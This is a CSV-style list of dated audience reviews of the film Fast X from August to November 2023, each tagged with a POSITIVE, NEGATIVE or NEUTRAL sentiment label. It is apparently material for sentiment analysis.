"Nov 5, 2023",NEGATIVE,"Revving, explosions, tumbling flaming vehicles, impossibly attractive humans being ridiculously tough and laughably cool. If you're into predictable, noisy, expensive stupidity, this one is for you!!"
"Nov 5, 2023",NEGATIVE,"Frenetic, but boring. Fast, but slow. ""Furious"", but silly."
"Nov 4, 2023",POSITIVE,Best Movie of 2023 NO CAP
"Nov 3, 2023",POSITIVE,It was okay. A popcorn delight of a spectacle and the action only gets pacier.
"Nov 1, 2023",NEUTRAL,The stunts are getting tired but Jason Momoa's portrayal of a crazy killer made it worth watching.
"Nov 1, 2023",NEGATIVE,"Special effects superior . Already established actors excellent scenery fantastic visiting all these countries nothing like it!! Jason Momoa well, his part needed further work and insight 
He came off more as the Joker in Batman and not at all as an original character   This was very disappointing as I feel his acting has improved a bit, his rhetoric was boring costume was great. I feel he should went in and out of his facade with a deep masculine dialect. He never came off as serious just a skipping stone across the waters of terrorism. This method of acting gave no pause or regard to the tragic sequences unfolding; one scene went into the other losing the intenseness it should have portrayed. Again it gave pause for a yawn. Too much in special effects without intense acting. Kept me wondering. Did this movie turn into a comedy when I blinked? As I am pondering this thought I lost control of the story line."
"Oct 31, 2023",NEGATIVE,"Unrealistic poppycock — I hope I live 144 minutes longer so I can make up for the time this mindless drivel stole from me.  Innie Dieselbreath suuuuucks at acting; Jason Mamoa's performance was surprisingly good. I recommend skipping all the scenes without him.  All the ""good"" criminals are bulletproof and indestructible while the armoured vehicles and soldiers were made of papermashe."
"Oct 30, 2023",NEUTRAL,"So disapointed! This just keep going the wrong way.. Where is the director, who sees everything from a neutral angel!
U just simply cant use video used to make the other movies?! Its not like there were a random person recording the train heist…"
"Oct 30, 2023",POSITIVE,"jason momoa es lo mejor de la película su actuación fue grandiosa la traición en el final  . lo malo Vin Diesel Ni siquiera una herida para darle drama  .
Jason Momoa is the best thing about the movie, his performance was great, the betrayal at the end. the bad Vin Diesel not even a wound to give him drama"
"Oct 29, 2023",POSITIVE,Better than the last one. I think they are on the right path to end this series.
"Oct 28, 2023",POSITIVE,"What a blast. This movie was so much better than F9, I can't put into words how much fun I had watching this. I laughed at this movie more than I have any other film in the franchise. How can you not like this? sometimes people need to throw logic out the window and just have a good time.
this movie was great and one of the best in the franchise. I can't wait for part two, FOR FAMILY!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
"Oct 28, 2023",POSITIVE,Best movie series i ever watched
"Oct 28, 2023",NEGATIVE,Epic POS. The next movie is going to be rocket propelled wheel chairs. Seriously give it up already VinDiesel. FYI I waited for this POS of a movie to be free before watching it.
"Oct 25, 2023",NEUTRAL,"Not the greatest Fast film, always out of this world and over the top, Momoa makes this film, unreal bad guy!"
"Oct 24, 2023",NEGATIVE,"This movie has some great action sequences, and you can tell that Mr. Mamoa was truly enjoying every second of making this movie. The storyline is extreme and spotty at best."
"Oct 22, 2023",NEGATIVE,"So everyone can come back from the dead in this franchise. It's like a soap opera. This is getting out of hand now. Unbelievable stunt scenes and this overly flamboyant character Jason plays...ugh. Now, we have to wait for a part 2! Annoyed."
"Oct 21, 2023",POSITIVE,"This was the most fun of the Fast movies by far! Yea, some of it was predictable, and some of the effects were noticeable but I LOVED it! The acting was awesome, I laughed, gasped, jumped, cheered and hid behind my hands. So great, can't wait for the next, and also so sad they're talking about ending the series. Solid movie. Thanks Fast Fam!"
"Oct 20, 2023",POSITIVE,"Newcomers or casual viewers won't think much of it, but as a longtime fan, I really enjoyed this film and if you liked Fast Five, then this is definitely right up your alley."
"Oct 19, 2023",POSITIVE,Great Movie!!! Highly Recommended!!! A++ 🍿🎥🍿
"Oct 16, 2023",POSITIVE,This was one of the better ones for sure.
"Oct 16, 2023",NEUTRAL,"Eu me pergunto se o meu amor pela saga fez com que eu pegasse leve na hora de avaliar Velozes e Furiosos X. E sim, a resposta e sim. 
Para falar a verdade, não é um filme ruim, só a história é precária, e o final sem sentido e acabando de uma forma rápida, sabe? 
Sinto que quanto mais essa saga fizer dinheiro para as empresas, mais continuações irá ter, e aos poucos, vai se desgastando e perdendo a essência que tinha no início. 
Recomendo, mas para se divertir, vá sem muitas expectativas, tá?"
"Oct 15, 2023",NEGATIVE,"These movies just get more and more dumb... I enjoyed the first few, I feel like they completely lost the plot a few movies ago though. This one is, by far, the dumbest, I barely even finished it."
"Oct 12, 2023",POSITIVE,"Isso é muito bom cara, esperava menos, mas gostei bastante!"
"Oct 12, 2023",POSITIVE,BEST FAST AND FURIOUS MOVIE YET! FAST ACTION AND FURIOUS THRILLER! A MUST SEE!
"Oct 9, 2023",NEGATIVE,"One of the worst film 
it start with the worst sequence of the saga  this  is just horrible i have predict every scene  before it happen why bother making sense less    should  more about car and fun  less epic shitless  sense less explosion damn this was painfull to watch  should make a parodie but its already an unfunny parodie"
"Oct 8, 2023",NEGATIVE,"Sadly, the time has come for this franchise. It's been on the horizon for awhile, but the action is now wildly overshadowed by the bad jokes and high cheese acting. Jason Momoa is unbelievable and laughable at best. Alan Ritchson is a C level soap opera actor. Even the Vin Diesel charm was mischaracterized and lost! And can we stop this garbage storyline of Brian being safe ""somewhere""? Ten is definitely the end for this franchise and sadly it will not go out on a good note."
"Oct 8, 2023",POSITIVE,"The best part of the movie is how pshycopath the Khal Drogo here, awesome performance.

Will I watch the next sequel? Yes."
"Oct 7, 2023",NEGATIVE,"This is getting really silly no stakes as everyone is invincible. Women and men are super human. What really is the point. Hollywood really needs new ip. Our simply kill of the old fogies I don't care. If the new story is good it really does not matter who is the cast. 

One of the better fast movies had 0 of the original cast like Tokyo drift."
"Oct 7, 2023",NEUTRAL,"+ First action sequence with the bomb rolling through the Vatican is great.
+ Unlike F9, this movie leaned into Cena being hilarious and benefited from it. 
+ At least there is only one more, or so we are told. 
+ Momoa is probably the best villain of the Fast franchise. He is at least unique, whereas all the other Fast villains blend together into an amorphous tech guru evil genius.

- Brie Larson is painfully bad, and it is really hard to stand out for bad acting in a Fast movie. 
- The Cena and Little B scene on the plane was a special kind of stupid. 
- The ""who are you going to choose"" scenes make zero sense. Terrible rehashing of the Nolan Batman theme. 
- Cena... spoiler here... died by turning the rocket thrusters down, jumping a median, and killing a bowling pin setup of baddies? Why? How does this meaningfully help Dom get away?"
"Oct 6, 2023",NEGATIVE,"""Same tired story. Same played out stunts.  Same bland acting. """
"Oct 5, 2023",POSITIVE,Jason was incredible! Loved the intensity of the movie. Very good
"Oct 5, 2023",POSITIVE,"Vin diesel never fail to deliver an action packed fast and furious movie, this one is better than I ever expected."
"Oct 4, 2023",NEGATIVE,Entertaining as always. Great action. But ruined by jason mamoas annoying character and terrible acting!
"Oct 1, 2023",NEGATIVE,"Jason Momoa is horrible in this movie. Over acted and I use the term ""acted"" loosley. Being pretty will only take you so far and the writing for his part was embarrassingly horrible. How did Vin Diesel ever agree to this? Everyone else was fantastic in their roles. Such fun to watch them. I would be looking forward to seeing the next movie if it didn't include Jason Momoa."
"Sep 30, 2023",NEGATIVE,Two-parter that's 2.5 hours long that's that terrible? Count me out on the second half.
"Sep 30, 2023",NEGATIVE,Jason Momoa was good but the movie sucked.
"Sep 29, 2023",NEGATIVE,This was somehow an improvement over F9 but still so ridiculous. They officially aren't taking themselves serious anymore which is good in a way. I unfortunately will be looking forward to 11 & 12 to see how they conclude this series
"Sep 24, 2023",NEGATIVE,"What a joke of a film. This series becomes more ridiculous with each outing. Subpar special effects and terrible acting. The writing is crap one-liner after another and seem like they were written by middle schoolers. All common sense and rules of gravity are ignored. The good guy's cars can fall from deadly distances or survive multiple crashes that incapacitate or explode every other car. Death doesn't matter because any character can just reappear whenever like magic. Rail-thin women can suddenly overcome trained and armed secret agents or top tier mercenaries with ease. Since they went to space already, my guess is in the next inevitable sequel they go and fight Cthulhu or drag race Jesus for Dom's dad to come back to life. And Dwayne calls him a ""sumbitch"" while either covered in sweat or spitting, because he has to say that in every movie, like the sad, one dimensional character he is."
"Sep 24, 2023",NEUTRAL,"For me, the least interesting part of an action movie is the car chase scenes and this movie is full of them.   If that's what thrills you then you must watch this movie.  I loved the cast, it's what kept me watching until the end.  Mamoa plays a convincing maniac and Theron is fabulous, as always no matter the role she plays."
"Sep 24, 2023",NEGATIVE,"WTH did I jst watched?!?! SMH! I have watched all FF movies… but this one left me saying WTF was this man… smh!! The aquaman guy is trying waaay to much, is he supposed to be a villain or a wanna be comedian! It was hard to keep up with all the actors. And WTH with the END man!! "
"Sep 24, 2023",POSITIVE,"Amazingly good graphics awesome cast good movie be sure and keep watching after the credits, so yes I will recommend it James Welch, Henderson, Arkansas September 23, 2023"
"Sep 23, 2023",NEGATIVE,How do most of the characters have copies of the old Fast movies? Why do the cars make TIE fighter noises in one scene? How are these still being made?
"Sep 23, 2023",NEUTRAL,a really really dumb movie felt like part 1 cliffhanger movie jason momoa was the only reason i recommend seeing this film only once i saw it on peacock app. this film is better than f9 but on par with f8 this should of stopped after F7 but all well a dumb movie and way too long but worth seeing for jason mamoas performance and the dumb action scenes. not the best fast film but not the worst.
"Sep 23, 2023",POSITIVE,"Fast X is fantastic, non stop action, great cast and surprises. Absolutely entertaining movie."
"Sep 22, 2023",NEUTRAL,"I enjoyed this one more then I did F9, but that's unfortunately not saying much. You still get the great action scenes, as well as seeing the characters we all love. Jason Mamoa plays a pretty good villain, but the movie is still pretty dumb lol. I know it's been that way for the past few movies, but that still doesn't excuse it. My main negative is just that I can't stand them bringing back dead characters. With Han from F9, and now Gal Gadots character in this one. It ruins there death scenes from previous movies, but also it ruins any potential deaths in this movie and moving forward. Why should I be invested in these characters when I know they'll always survive. That aside, Fast X is fine. If u liked the previous ones u should enjoy this one too."
"Sep 22, 2023",POSITIVE,"La saga de rapido y fusiosa es increible, con todos estos actores, la velocidad es mi motor, ver los autos volar y las acrobacias ya quiero ver la parte 2 de esta saga"
"Sep 22, 2023",NEGATIVE,This movie is atrocious. A spit into the face to all the true car enthusiasts. CGI looks like something out of an early 2000's tv show. Story makes no sense. The writing is childish at best.
"Sep 22, 2023",POSITIVE,"Super cool, la tienen que ver"
"Sep 21, 2023",NEGATIVE,"Fast X works when it's giving you the bombastic spectical you'd expect, yet it fails in character and stretches it self thin not really feeling like it needs to be a Part 1 and chose to do that to ride the hype train."
"Sep 21, 2023",POSITIVE,Se ha vuelto más que un clásico.
"Sep 21, 2023",NEGATIVE,nunca me han gustado estas peliculas
"Sep 21, 2023",NEGATIVE,Es una película  donde hay bromas Incluso  Se impulsa la venganza Decidido a destrozar familias
"Sep 20, 2023",NEGATIVE,"This was the height of ridiculousness. They retconned the plot and tied it in to the best movie of the franchise, and brought back like every character who's ever been in one of these things. The best performance is probably Mamoa, and everyone else is just taking a check (maybe Ritchson is pretty good). Captain Marvel sucked in this, Groot wore makeup to look younger, and even Charlize is just daydreaming through this. I really had no clue WTF was even happening most of the time. It was definitely better than the last movie, but I just felt it was overstuffed and pretty stupid by the end. And like half the scenes Mamoa is in, he just stands there with his arms out waiting for some shit to explode. Bigger isn't always better, and this movie is also totally racist. Mamoa is not a Latino, and they mispronounce every Latino word or name-""Hernan,"" ""Maduros,"" etc...quality over quantity woulda been better."
"Sep 20, 2023",NEGATIVE,"Hahahahahahahahahahahahahahahaha
This movie is ridiculously stupid."
"Sep 20, 2023",NEGATIVE,"This was the worst of all of these movies, the stunts were just stupid, the acting was horrid, and, whoever dressed Jason Mamoa should have been fired especially giving him the librarian glass holders. I just can't think of 1 thing that I could like about this movie, oh yes, that I am hoping it is the last one."
"Sep 19, 2023",NEGATIVE,"I wanted to like this movie. Every villain coming together over the years to be on Dom's side, it had racing in it, the story line with Jason Momoa was actually really great. But the acting was atrocious. It was so cringey, and honestly felt like they were reading off powerpoint slides the whole time. I couldn't even enjoy it because the acting and CGI were the worst things I have ever seen."
"Sep 19, 2023",NEGATIVE,Worst ending of all 10 movies.
"Sep 18, 2023",NEGATIVE,"""Why do I keep watching these?"" Is the thought that goes through my head every time I am halfway through a 'Fast' movie since like #5. Terrible acting, terrible writing, terrible plot. Action sequences predictable. Just awful."
"Sep 18, 2023",NEGATIVE,"This film is a joke, it shouldn't be called a film in the first place, awkward acting, laughable plot, terrible CG. It's unreal we still have to bare with this kind of trash every year."
"Sep 18, 2023",NEGATIVE,"forced myself to watch this one, i had just watched fast 5 not knowing they were tied together. momoa's acting seemed like he was trying way to hard, there was just way to many characters to follow and per the usual the action scenes were over the top but some of the dialogue just wasnt there. they really just need to let the franchise go at this point."
"Sep 18, 2023",NEGATIVE,"FF movie series has that magic formula where the characters and action are ones you always enjoy.  This one was not as close knit as they were separated.  There is also some fun cameos but not sure why or how Brie Larsen wormed her way into the movie. 
Only other complaint is even though  Jason Momoa acted his parts well,  it was random after the intro younger silent revenge face scene to different scenes later in the movie where he is almost like a mix of his flamboyant character in Slumberland and a bit Joker-esque as others have said.  I assumed it was just him going insane with his mission to make Dom suffer...but it wouldve been better if they build up storyline to his insanity.  It felt like ax totally different character from beginning (or newly inserted FF 5 scene).
I always seem to enjoy this low substance FF series still.  I don't expect anything as usual and will enjoy Fast and Furious as the always over the top on action packed physics defying sci-fi spy vehicle mayhem movie with a touch of  ""family"".   
Action will still never disappoint no matter how much fans and audience think this is one is better or worse than the others in the series."
"Sep 17, 2023",NEGATIVE,"If I was in the theatre, I would have walked out.  I have been watching F&F series since it first came out in theaters and this was hard to sit through.  As my 15 year-old son said during the movie, this movie doesn't make any sense.  I couldn't agree more. There were too many themes going on and This has gotten so far fetched from street racing. I'll Google how 11 ends because I can't see myself sitting through another one of these. I do like that they avoided politics in today's age - props on that."
"Sep 17, 2023",NEGATIVE,"First off, I loved all the cameos, kind of made the (hopefully) end of this franchise better. Jason Momoa while pleasant to look at and started out, really interesting and funny, ended up being preachy and just eye rolling BAD. The stunts are too much CGI, the audience is only going to let so much go before it's just comical and stupid. Vin Diesel picking up a car and THROWING 6'5 Momoa around? Vin Diesel driving down a dam in FLAMES..again. Besides the blaring obvious Vin Diesel being in love with his own character and his own ego, Paul Walker wanted this franchise to stop at 6, and it should have. This format is tired, the actors LOOK tired of playing these characters and if I have to hear Vin Diesel say or act upon the word "" family"" one more time I may vomit.  All around, not even John Cena being funny and goofy could save this train wreck."
"Sep 17, 2023",NEGATIVE,Had one main addition that really made the movie worth watching!
"Sep 17, 2023",NEGATIVE,"Horrible. I literally continued to watch it only because I can't believe how bad it was. Everything about it was so bad 👎 the acting, cgi .. everything."
"Sep 17, 2023",POSITIVE,The odes to former characters and the ongoing plot effectively illustrate the recurring theme of family and loss in the Fast and Furious franchise. Fast X is a film that you will undoubtedly appreciate if you like action with a bit of humor and thriller
"Sep 17, 2023",NEGATIVE,The worst movie of the Saga. So rude
"Sep 17, 2023",NEGATIVE,"Wish I could give it -5 stars. This franchise needs to end, corniest shit I've ever seen."
"Sep 17, 2023",POSITIVE,X times the rush!! Good popcorn franchise never disappoints!!! Don't over think it and just enjoy the ride.
"Sep 17, 2023",NEGATIVE,"The previous several movies were so over-the-top ridiculous that made it somewhat hilarious and entertaining.  This one definitely doesn't disappoint in that aspect yet this time to the point it's not even entertaining anymore... and then to make it 2 1/2 hours, it's just way too long and drawn out.  Then to add insult to injury, it doesn't even add a conclusion.  Just like the newest Mission Impossible and Spiderman, movies seem to be moving towards cliffhangers.... booo on all that!"
"Sep 17, 2023",POSITIVE,"Excelente película de acción y comedia, con buen humor y buena para sonreír, la combinación de actores es fenomenal, y la secuencia es genial, muy divertida."
"Sep 17, 2023",NEUTRAL,"Recomendable, muy buena"
"Sep 17, 2023",POSITIVE,"Rápidos y furiosos siempre han sido una saga de películas exitosas ahora nos deleitan con esta nueva aventura que no me ha decepcionado , coches hermosos velocidad y ahora todo por la familia."
"Sep 17, 2023",POSITIVE,"Esta muy entretenida, aunque ya pan con lo mismo, ya hace falta un cambio"
"Sep 17, 2023",POSITIVE,La mejor saga de accion. Siempre recomendada
"Sep 17, 2023",POSITIVE,"Such a great history, a wonderful movie!!"
"Sep 17, 2023",POSITIVE,Da risa ya no es como las anteriores
"Sep 17, 2023",POSITIVE,"Para pasar un buen rato es buena la película, palomera"
"Sep 16, 2023",POSITIVE,"Only an hour into the movie thus far but, it has been really good. So the scene where han and roman make comparison about penis? lol because the angry birds measured that one limp pic 7.5, but gets 8.25"" erect. ""going up against a v10, but the alfa is better on these streets."" Lol as one of my best and only chiese friends from psu would say. It's all about finesse. Or as I'd like to say ""If you want to find the secrets of the universe, think in terms of energy, frequency and vibration."". ― Nikola Tesla. Applies to females for sure. Also, I hope the actors and film studio don't mind but I am posting that true statement to tiktok. ""This isn't fair dOM's team have gotten their hands dirty and gone to hell and back for this agency so we could keep our hands clean This is bull shit and you know it."" Posting that once I can get my phone to charge."
"Sep 16, 2023",NEGATIVE,"The Fast X movie suffers from an overwhelming amount of content, leading me to a cross between feelings of fatigue and boredom. The reliance on elements from the previous nine Fast movies results in a lack of originality, making the film predictable. The excessive use of special effects, taking up 90% of the film, detracts from the overall experience and feels excessive. Less is sometimes more.The portrayal of the villain, played by Jason Mamoa, is overly exaggerated and overacted, which hampers the believability of the character. A particular scene involving the painting of dead men's toenails deems repulsive and unnecessary, adding nothing to the plot. We get it, Mamoa's character is deranged. The editing of the movie is subpar, failing to effectively manage the content and resulting in a disjointed viewing experience. The absence of a proper ending, replaced by a cliffhanger, is disappointing and feels like a cheap tactic to lure audiences back for another installment. The film also featured too many characters and resurrected deceased ones from previous Fast franchises, which can be confusing and dilutes the impact of their previous exits. The writer responsible for this storyline should be held accountable and not given further opportunities to write for the franchise."
"Sep 16, 2023",NEGATIVE,"Usually these movies are great in their ability to entertain with fast cars and silly action. That being said, trying to add so many names, brought it down quite a bit. Jason Momoas performance was horrible, he's already an average actor at best, but this performance was so bad. Brie Larson was another failure. The cars as usual were cool, the action scenes were mostly good, some of the fight scenes were so unbelievable and weak. John Cena was ok, but didn't add much. Overall it was one of the worst in the series... I hope they let this series die already, it is way past its prime."
"Sep 16, 2023",NEGATIVE,Worst collaboration of the DC/ Marvel universes I've seen yet.
"Sep 16, 2023",NEGATIVE,What in the blue hell did I just watch?
"Sep 16, 2023",NEUTRAL,A bit insane but if you are looking for fun action. It's crazy good! Jason Mamoa made such an interesting villain.
"Sep 15, 2023",POSITIVE,Great action and suspense. When in the mean time it's a movie the things they do with cars is impossible. Just stay sane don't try this at home!! Lol
"Sep 15, 2023",NEGATIVE,Absolutely rotten film! I'm not even gonna list the reasons why because you already know them.
"Sep 14, 2023",POSITIVE,"First of a two-parter. Fast X is the Infinity Wars, and no doubt Fast XI will be the Endgame, with Mamoa being Thanos."
"Sep 12, 2023",NEGATIVE,"I just don't know what to say lol, the film is RIDICULOUS, the only positive , Jason mamoa is having a blast playing the bad guy , he also seems to have eaten a lot of pies lol ."
"Sep 11, 2023",NEGATIVE,Terrible. Hard to watch.
"Sep 10, 2023",NEGATIVE,"Fast X was awful and set up for a part 2

The best part of the movie was Jason Momoa - everything else was pretty much crap - Michelle Rodriguez is still playing the brooding teenager."
"Sep 10, 2023",NEGATIVE,Was the worst one I've seen and have seen them all Paul walker has to be rolling over in his grave Jason monoa ruined it for me will never watch another with him in it good luck
"Sep 10, 2023",NEGATIVE,A feeble and long excuse for ridiculous stunts and terrible VFX with hardly any plot. Total crap.
"Sep 9, 2023",NEUTRAL,"I am a big fan of the franchise. If this was in fact the last movie, I did not like the ending or the fact that the villain was always 10 steps ahead of everyone with a seemingly endless supply of tech and resources that rivaled that of the old westerns and their endless supply of bullets, in a gun fight.  
I liked seeing everyone again, even the trailer at the end was good and would lead someone to believe there is an opportunity for a side story. 
Based on the old characters reappearing, it made me realize, there are 10 movies and I may have to go back and watch them to follow all the bouncing balls. 
Jason M. Played an excellent Psycho. Maybe too much for this franchise."
"Sep 9, 2023",POSITIVE,"Nice movie , must watch"
"Sep 7, 2023",NEUTRAL,"Too long by half, but imaginary, ridiculous, car crashes for the kid in you.  Loved Jason  Momoa but he had too many silly jokes."
"Sep 7, 2023",NEUTRAL,"Fast X is a very good film, but I felt that there are things that seem to be very repetitive, the direction and the script are very good, but for me the saga should already be over but the more films the better for the fans, I'm waiting for eleventh movie!"
"Sep 7, 2023",POSITIVE,"First time watching fast and furious series, still feel so excited and interesting while watching it even though I didn't manage to watch the previous series. Won't feel boring at all! Nice movie to watch!!"
"Sep 6, 2023",NEGATIVE,"Fun fact; when your bad guy is just a rich boy duechebag with somehow god level powers ""because computers"" you might want to just stop already. 

This movie was so half-assed & forced you'd think it was directed by Brett Kavaugh. Even worse, it dares to end on a cliffhanger like anyone cares enough to want to watch another one."
"Sep 6, 2023",POSITIVE,this movie is very good
"Sep 5, 2023",POSITIVE,Fun and action packed.  I really like all the cameos as well.
"Sep 5, 2023",NEGATIVE,"Garbage movie, no plot, uncharismatic actors, only a commercial for Stellantis."
"Sep 5, 2023",NEGATIVE,The movie was way too silly for me. The villainous role was ridiculously written. The actor played  his part in  a stupid way.  He's better off doing an Aquaman sequel.  I was not impressed with this Fast movie.  😕 The only good part was the driving experience.
"Sep 4, 2023",POSITIVE,Love to see this movie so much😍😍😍😍
"Sep 4, 2023",NEGATIVE,The script needs more work. The villain is not convincing. They probably should have ended it years ago. They will probably never stop making these movies. It was an ok movie.
"Sep 4, 2023",NEGATIVE,"While the cast line up is great unfortunately the cars (not the action scenes) were the best part of the movie along with the fight scenes. So much unrealistic events go on in this movie. Jason momoa's Dante was the most realistic. He wasn't too over the top and did a good part portraying a new villain with a twist. Not the same old bad guy that's mean and strong. Although, I would have loved there to be a fight scene with Dante whooping Dom, then maybe the other way in part 2 of fast X. Anyways the special effects felt fake. The script is predictable from scene to scene. And my God the cheesy one liners / "" fast quotes"".  Glad I didn't spend money in the theater for this one. Good job to Jason Momoa keeping it real and original. Vin and the rest I'm sorry but could have been alot better. Maybe next time for part 2."
"Sep 4, 2023",NEGATIVE,"The same one-liners , tired driving scenes, and ridiculous fights. Writing and plot are never a consideration. The cast was great, but not great enough to salvage this flick."
"Sep 3, 2023",NEGATIVE,"Worst movie I've ever seen actually. Girls kicking grown men with guns and armour and knives asses. The magic flying cars, a nuclear bomb that blows up in the centre of Rome with no casualties, everybody's inability to be dead, vin diesel (55) staring at 19 year asses, helicopters crashing like Kobe,"
"Sep 2, 2023",POSITIVE,Great movie! Will definitely recommend to others!
"Sep 1, 2023",POSITIVE,Good and attractive movie to enjoy.
"Sep 1, 2023",POSITIVE,Well the movie was epic and I hope soon I can’t back down to family of the greatest Dominic Toretto we stay to fight and win and I will be waiting for the final film
"Aug 31, 2023",POSITIVE,"Look, if you're gonna see and Fast & the Furious you know what you're gonna get. You know there's gonna be car chases, you know it's gonna be over-the-top, but I still enjoyed this movie."
"Aug 30, 2023",NEGATIVE,This movie is really a piece of violence porn crap with so much CGI and absurdity that it should have just been an animated cartoon. Not worth the time you have to spend to get through it.
"Aug 30, 2023",POSITIVE,Has been chasing from first season. Good Good Good
"Aug 30, 2023",NEGATIVE,"WORST MOVIE OF FF, this was way too long, I felt I was watching 3 different movies. Jason was awful he was not funny he over acted, Not sure who died and lived and well whats up with the SUB? 😱"
"Aug 30, 2023",NEUTRAL,Too much and too little; it has not been what made it great since Paul Walker. Overdose of family pathos to the point it seems forced. The action though captivating does not have the emotional connection it once had. Love the crew; but yesterday is gone. Move on.
"Aug 29, 2023",NEGATIVE,"Fast X - 4.5/10. Okay, so I'm obviously not the target audience for these movies. But, I still gave it a shot (considering this is a 2 parter turned 3 parter finale). And oh boy, is this movie a hilariously bonkers film. Fast X is, shall I put it lightly, an over the top extravaganza of the highest order. I didn't mind the gravity and physics defying stuff. I expect that. What I wasn't expecting was how much lower the acting, writing, and dialogue delivery would get. How hilariously bad it all was. Sheesh. If you want to hear my full thoughts, click on the link above. Because I really don't want to write out all of it. I will admit though: I did have a lot of fun with this film. All for the wrong reasons of course, as its unintentionally funny."
"Aug 29, 2023",NEGATIVE,"Terrible mess, impossible gravity.."
"Aug 28, 2023",POSITIVE,Action packed!! I loved it.
"Aug 28, 2023",NEGATIVE,"Horrible,  no real dialogue talk. The comment about masculinity made me turn it off and nail polish. Soft and the non furious.  Glad I didn't pay at the theater. I'm done with the franchise. Now I know why the rock quit."
"Aug 27, 2023",POSITIVE,The movie is very nice and amazing.
"Aug 27, 2023",POSITIVE,This movie is really amazing and stimulate. Fast series movie always attract me
"Aug 27, 2023",POSITIVE,"Wow, it seen like tense and exciting"
"Aug 27, 2023",NEUTRAL,"Great acting,good music, the plot is ok but I felt like some scenes were overdone it doesnt quite immerse you into the world of fast x tbh I prefer the old faf movies it's much more detailed in everything fast x doesn't have the thrilling vibe like it's predecessors but what I felt was the most horrible was the CGI the CGI was very much neglected if it continues I'm afraid the future installments would be unbearable to watch"
"Aug 26, 2023",POSITIVE,It's a great movie. Fast & furious. It'll keep you on your toes. Truly thrilling!
"Aug 25, 2023",NEGATIVE,"Fast X is incoherant Chaos, cut and past action movie. It was so confusing, I could not finish the movie. It is the worst movie in the Fast & Furious series. Jason Momoa is a miss cast."
"Aug 24, 2023",POSITIVE,The only difference between this and Fast 9(The worst movie on earth) is that John Cena gets to have fun and Jason Momoa is eating up the screen. And it's much better for it!
"Aug 24, 2023",POSITIVE,It stimulate and Deckard Shaw is brave and handsome
"Aug 24, 2023",POSITIVE,"Exciting and thrilling movie, the links are closely linked, very exciting, the actors' acting skills are very realistic, the acting skills are very good, the subject matter is very attractive, it is worth watching, a good popcorn movie"
"Aug 24, 2023",POSITIVE,Nice! Absolutely enjoy the movie
"Aug 24, 2023",NEGATIVE,The role Jason Momoa has to portry is the worst naritive producers could have added to the story line.
"Aug 23, 2023",POSITIVE,LITERALLY AMAZING!!!! CANNOT WAIT FOR THE NEXT ONE!!!! So thrilling!!!
"Aug 23, 2023",POSITIVE,"In short, car racing is racing like 007, fighting with family, life, science and technology, and soldiers."
"Aug 21, 2023",NEGATIVE,"Just get it over with! The series really lost its place after the sixth one. Now, every new movie just builds on utter nonsense and interestingly surpass the previous movie in that. Why am I still watching? Honestly for the sake of the very first movies."
"Aug 20, 2023",POSITIVE,"It's another corny Fast and Furious movie, with a great antagonist for a change.  If you're into all the other movies in the franchise, you'll like this one."
"Aug 20, 2023",NEGATIVE,"The only things i like about this movies is the actions and dante, And that's it. This movie feels like a reunion. They need to stop making this movies, they were great once."
"Aug 20, 2023",NEGATIVE,"This is the worst piece of horse shit I've seen, and I've seen VelociPastor and both Iron Skies… those at least had some redeeming qualities by the way. Not sure why you would shoot a handgun to try and stop a boulder bomb, but OK, I'll try to roll with it."
"Aug 20, 2023",POSITIVE,Gostei!! Ação em cima de ação!! E um elenco invejável!!
"Aug 19, 2023",NEGATIVE,I can't recommend this movie.   Way too hard to understand what's going on.  Had to turn it off at 15 minutes.  A waste of my time and money.
"Aug 18, 2023",NEGATIVE,the first 40 mins of the film are good
"Aug 18, 2023",NEGATIVE,"These films used to be dumb, stupid fun. This one is just dumb. After watching this I immediately went to check if they had any reshoots or creative issues and sure enough they changed the director from the previous films and rewrote the script. It shows. The plot is so full of holes it's unbelievable: how do you accept a job from a top secret agency, said agency isn't aware of any job and nobody can contact you. Dom and Letti leave days after his crew has already left but still arrive on the day of the heist. Minimal if any casualties in Rome. Dom and Elena's kid doesn't look like either of them and doesn't look like the baby used in the previous film. Why would Cena make a vehicle where the gun turrets are able to face down and still fire? Why is Bri Larson carrying God's Eye in her pocket instead of hiding it away safely? How do you sneak up on Dom and company in a freaking helicopter? How does Reyes hack and steal all their money with Tej and Ramsey(The creator of God's Eye) there. Then you have Dom's Crew acting totally out of character. Everyone wants to be a badass. You have Tej flipping bad guys and Ramsey beating up guys in body armor. Bro Larson beating up a bar full of grown ass men. I mean cmon. Tyreses' character change is mind boggling. They made him look incompetent and he was insufferable in every scene. The moneybag gag was terrible and none of his jokes landed. Cena now plays himself instead of Dom's brother like in Fast 9 and even has a 'You can't see me' moment. Then there's bad writing and continuity issues. God's Eye is the MacGuffin again. Dom is having a teary eyed moment thinking about Brian(Paul Walker) while Charlie Puth is playing in the background even though Brian is still alive in the movie. Shaw starts fighting with Han even though their issues were supposed to be resolved previously. They sidelined the brilliantly evil Cypher for Reyes who is way too over the top. Reyes is supposed to be some Joker-esque type villain but for the most part is just downright creepy. And how exactly do they prepare us for all his insanity? His father mentions that he's crazy in passing at the start of the film. The guy introduced is not the insane guy we eventually see. Reyes also doesn't connect as the villain cos he's basically shoehorned into the film using old scenes. He's a random nobody who gets knocked off a bridge and his plight is not justified. Hobbs killed his dad and that's why him going after Dom feels so empty. The action pieces were done before and are underwhelming. As if that's not bad enough you have the characters seriously commenting on the insane stuff they did in a previous scene. Just pure cringe. I'm not sure how Vin allowed this but the magic is gone. It's like they took every theme, meme and every trope from the previous films and crammed them into this film just for the feels. They even reuse old sets. In the end I don't know how a sequel or two is gonna redeem this."
"Aug 17, 2023",POSITIVE,"This is seriously a must watch in the theatre. Good, old style, classical action flick."
"Aug 15, 2023",POSITIVE,From the first episode to fast x is still so good
"Aug 14, 2023",NEGATIVE,"It has a good cast, a good scenario but the story ends up differing from the biggest focus of people that would be to see the cars  if the saga of the movie was just action, it would be good, but currently the movies  have a bad stories with few car scenes which is the main aspect that people want to see"
"Aug 14, 2023",NEGATIVE,"I don't know if it allowed here to compare movies, but watching Mission: Impossible and Fast X at the same time makes me compare in my mind, there is no even way to put those movies together, Fast X pushes you to the edge of telling you ""this is fake"", in the other hand Mission: Impossible is always making you believe that this can really happen, every action scene in Mission: Impossible is created to give you this impression, but Fast X is .. really very bad movie"
"Aug 14, 2023",NEGATIVE,It's bad don't watching.
